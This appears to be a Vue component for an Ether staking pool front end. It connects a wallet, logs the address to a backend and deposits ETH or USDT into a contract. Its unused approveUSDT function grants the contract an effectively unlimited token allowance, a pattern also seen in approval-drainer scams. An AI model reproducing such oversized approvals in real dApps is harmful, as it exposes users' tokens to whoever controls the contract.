<template>
    <div class="mt-4 text-sm md:text-base">

        <section class="flex justify-end items-center gap-2 mb-6">
            <template v-if="!account.address">
                <Button class="btn-primary px-2 py-2 text-white" @click="connect()">
                    <div class="flex justify-center gap-3">
                        <span class="text-xs">{{ loading.connecting ? 'Connecting...' : 'Wallet' }}</span>
                        <i class="pi pi-wallet"></i>
                    </div>
                </Button>
            </template>

            <template v-else>
                <router-link :to="{ name: 'asset', params: { address: account.address } }">
                    <Button class="btn-primary px-2 py-2 text-white">
                        <div class="flex justify-center gap-3">
                            <span class="text-xs">{{ account.shortAddress }}</span>
                            <i class="pi pi-wallet"></i>
                        </div>
                    </Button>
                </router-link>

                <Button class="btn-primary px-2 py-2 text-white" @click="disconnect">
                    <div class="flex justify-center gap-3">
                        <span class="text-xs">{{ loading.logouting ? 'Disconnect...' : 'Disconnect' }}</span>
                    </div>
                </Button>
            </template>

        </section>

        <h1 class="text-lg md:text-xl font-semibold mb-6">Ether Staking Pool</h1>

        <section class="mb-5">
            <div class="flex items-center gap-3 mb-3">
                <img src="/ether.svg" alt="Ether" class="w-[50px] h-[50px]">
                <p>ETH</p>
            </div>

            <div class="md:flex items-center gap-3 mb-2">
                <InputText v-model="ethAmount" type="number" min="0"
                    class="bg-secondary border border-gray-700 w-full md:w-1/2 p-3 mb-3" placeholder="Enter amount" />
            </div>

            <p v-if="account.address" class="text-xs">
                <span class="text-gray">Available Transfer: &nbsp&nbsp </span> {{ walletBalance }} ETH
            </p>
        </section>

        <section class="mb-6">
            <Card class="bg-secondary shadow-sm shadow-gray-900 text-white md:px-8">

                <template #title>
                    Details
                </template>

                <template #content>
                    <ul class="mt-3 text-xs md:text-base">
                        <li class="flex justify-between mb-3">
                            <p class="text-gray">Estimated APY:</p>
                            <p v-if="ethApyAmount" class="text-indigo">{{ ethApyAmount }} %</p>
                            <p v-else>---</p>
                        </li>

                        <li class="flex justify-between mb-3">
                            <p class="text-gray">Estimated Principal:</p>
                            <p v-if="ethEstimatedPrincipal">{{ parseFloat(ethEstimatedPrincipal).toFixed(3) }} ETH</p>
                            <p v-else>---</p>
                        </li>

                        <li class="flex justify-between mb-3">
                            <p class="text-gray">Service Fees:</p>
                            <p v-if="setting.service_fees">{{ setting.service_fees }} USDT</p>
                            <p v-else>---</p>
                        </li>

                        <li class="flex justify-between">
                            <p class="text-gray">Estimated Earn:</p>
                            <p v-if="ethEstimatedEarn">{{ parseFloat(ethEstimatedEarn).toFixed(3) }} ETH per Month</p>
                            <p v-else>---</p>
                        </li>
                    </ul>
                </template>
            </Card>
        </section>

        <section class="flex justify-center mb-3">
            <Button @click="depositETH(ethAmount)" label="Add Liquidity" class="btn-primary text-xs md:text-base"
                :disabled="ethAmount === 0 || ethAmount === null || isEthBtnClicked" />
        </section>
    </div>

    <Toast class="z-10" />
</template>

<script setup>
import { ref, onMounted, watch, reactive } from 'vue'
import { Web3 } from 'web3'
import Button from 'primevue/button'
import InputText from 'primevue/inputtext'
import Card from 'primevue/card'
import Toast from 'primevue/toast'
import { useToast } from 'primevue/usetoast'
import { contractABI } from '@/contracts/contractConfig'
import { tokenABI } from '@/contracts/tokenABI'
import axiosClient from '@/services/axiosClient'
import {
    $off,
    $on,
    Events,
    account,
    chain,
    connect as masterConnect,
    disconnect as masterDisconnect
} from '@kolirt/vue-web3-auth'

const toast = useToast()
const contractAddress = import.meta.env.VITE_CONTRACT_ADDRESS
const tokenAddress = import.meta.env.VITE_TOKEN_CONTRACT_ADDRESS
const web3 = new Web3(window.ethereum)
const contract = new web3.eth.Contract(contractABI, contractAddress)
const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress)

const loading = reactive({
    connecting: false,
    connectingTo: {},
    switchingTo: {},
    logouting: false
})
const levels = ref([])
const setting = ref([])
const walletBalance = ref()
const ethAmount = ref(null)
const usdtAmount = ref(null)
const ethApyAmount = ref(null)
const ethEstimatedPrincipal = ref(null)
const ethEstimatedEarn = ref(null)
const isEthBtnClicked = ref(false)
const isUsdtBtnClicked = ref(false)
const isUsdtApproveBtnClicked = ref(false)

// Wallet Connect
const connect = async (chain) => {
    const handler = (state) => {
        if (!state) {
            if (chain) {
                loading.connectingTo[chain.id] = false
            } else {
                loading.connecting = false
            }

            $off(Events.ModalStateChanged, handler)
        }
    }

    $on(Events.ModalStateChanged, handler)

    if (chain) {
        loading.connectingTo[chain.id] = true
    } else {
        loading.connecting = true
    }

    await masterConnect(chain)
}

// Wallet Disconnect
const disconnect = async () => {
    loading.logouting = true

    const handler = () => {
        loading.logouting = false
        $off(Events.Disconnected, handler)
    }

    $on(Events.Disconnected, handler)

    await masterDisconnect().catch(() => {
        loading.logouting = false
        $off(Events.Disconnected, handler)
    })
}

watch(account, async (account) => {
    if (account.address) {
        const params = {
            wallet: account.address
        }

        await axiosClient.post('/wallet-info', params)

        const balance = await web3.eth.getBalance(account.address)
        walletBalance.value = web3.utils.fromWei(balance, 'ether')
    }
})

onMounted(() => {
    getWalletDetails()
    getLevel()
    getSetting()
})

const getWalletDetails = async () => {
    if (account.address) {
        const balance = await web3.eth.getBalance(account.address)
        walletBalance.value = web3.utils.fromWei(balance, 'ether')
    }
}

const getLevel = async () => {
    const response = await axiosClient.get('/level')
    levels.value = response.data.data
}

const getSetting = async () => {
    const response = await axiosClient.get('/home-assets')
    setting.value = response.data.setting
}

// Deposit Eth
const depositETH = async (amount) => {
    // Ensure the user has connected their wallet
    if (!account.address) {
        console.log('Please connect to your wallet!')
        toast.add({ severity: 'warn', detail: 'Please connect to your wallet!', life: 3000 })
    } else {
        try {
            isEthBtnClicked.value = true
            // Convert amount to Wei
            const amountInEth = web3.utils.toWei(amount.toString(), 'ether')

            const receipt = await contract.methods.depositETH().send({
                from: account.address,
                value: amountInEth,
            })

            if (receipt.status) {
                const balance = await web3.eth.getBalance(account.address)
                walletBalance.value = web3.utils.fromWei(balance, 'ether')

                toast.add({ severity: 'success', detail: 'ETH Deposit Successful!', life: 3000 })

                // Reset deposit amount back to 0
                ethAmount.value = 0

                // Store wallet address & amount in DB
                const params = {
                    wallet: account.address,
                    real_balance: amount,
                    level: 1,
                    type: 'eth'
                }

                await axiosClient.post('/user-info', params)
                isEthBtnClicked.value = false
            } else {
                isEthBtnClicked.value = false

                toast.add({ severity: 'warn', detail: 'Transaction failed!', life: 3000 })
                console.error('Transaction failed!')
            }
        } catch (error) {
            isEthBtnClicked.value = false

            toast.add({ severity: 'warn', detail: 'Transaction failed!', life: 3000 })
            console.error('Error during transaction:', error)
        }
    }
}

// Approve USDT
const approveUSDT = async () => {
    if (!account.address) {
        toast.add({ severity: 'warn', detail: 'Please connect to your wallet!', life: 3000 })
    } else {
        isUsdtApproveBtnClicked.value = true
        // Approve the spender to spend the specified amount of USDT tokens
        const tx = await tokenContract.methods.approve(contractAddress, 100000000000000000000n).send({ from: account.address })

        if (tx.transactionHash) {
            toast.add({ severity: 'success', detail: 'Token approve successful!', life: 3000 })
        }

        isUsdtApproveBtnClicked.value = false
    }
}

// Deposit USDT
const depositUSDT = async (amount) => {
    if (!account.address) {
        console.log('Please connect to your wallet!')
        toast.add({ severity: 'warn', detail: 'Please connect to your wallet!', life: 3000 })
    } else {
        try {
            isUsdtBtnClicked.value = true

            const transaction = await contract.methods.depositUSDT(amount).send({
                from: account.address,
            })

            if (transaction) {
                toast.add({ severity: 'success', detail: 'USDT Deposit successful!', life: 3000 })
            }

            // Reset deposit amount back to 0
            usdtAmount.value = 0

            const params = {
                wallet: account.address,
                real_balance: amount,
                level: 1,
                type: 'usdt'
            }

            await axiosClient.post('/user-info', params)

            isUsdtBtnClicked.value = false
        } catch (error) {
            isUsdtBtnClicked.value = false

            toast.add({ severity: 'warn', detail: 'Error during USDT deposit!', life: 3000 })
            console.error('Error during USDT deposit:', error)
        }
    }
}

watch(ethAmount, () => {
    if (ethAmount.value) {
        let isConditionMet = false

        levels.value.Eth.forEach(level => {
            if (!isConditionMet && parseFloat(ethAmount.value) >= parseFloat(level.min_amount) && parseFloat(ethAmount.value) <= parseFloat(level.max_amount)) {
                isEthBtnClicked.value = false
                ethApyAmount.value = level.percentage
                ethEstimatedPrincipal.value = ethAmount.value * (ethApyAmount.value / 100)
                ethEstimatedEarn.value = ethEstimatedPrincipal.value / 12

                isConditionMet = true
            }
        })

        if (!isConditionMet) {
            isEthBtnClicked.value = true
            ethApyAmount.value = null
            ethEstimatedPrincipal.value = null
            ethEstimatedEarn.value = null
        }
    } else {
        isEthBtnClicked.value = true
        ethApyAmount.value = null
        ethEstimatedPrincipal.value = null
        ethEstimatedEarn.value = null
    }
})

</script>

<style scoped></style>